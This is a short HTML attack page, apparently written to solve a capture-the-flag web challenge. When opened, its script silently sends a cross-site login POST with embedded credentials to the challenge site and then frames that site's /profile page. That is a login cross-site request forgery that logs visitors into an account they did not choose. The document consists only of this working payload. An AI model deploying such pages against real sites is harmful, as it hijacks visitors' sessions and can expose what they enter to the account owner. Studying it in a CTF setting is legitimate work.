<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>login check</title>
<style>body{margin:0;font:12px monospace}iframe{width:1280px;height:900px;border:0}#s{padding:6px;background:#eee}</style>
</head>
<body>
<div id="s">logging in...</div>
<iframe id="f"></iframe>
<script>
const SITE='https://spaceship.web.2026.sunshinectf.games';
(async () => {
  try {
    await fetch(SITE+'/login',{method:'POST',mode:'no-cors',credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'username=solver1&password=solver1pass'});
    document.getElementById('s').textContent='login attempted, loading /profile...';
  } catch(e) {
    document.getElementById('s').textContent='login error: '+e;
  }
  document.getElementById('f').src = SITE + '/profile';
})();
</script>
</body></html>
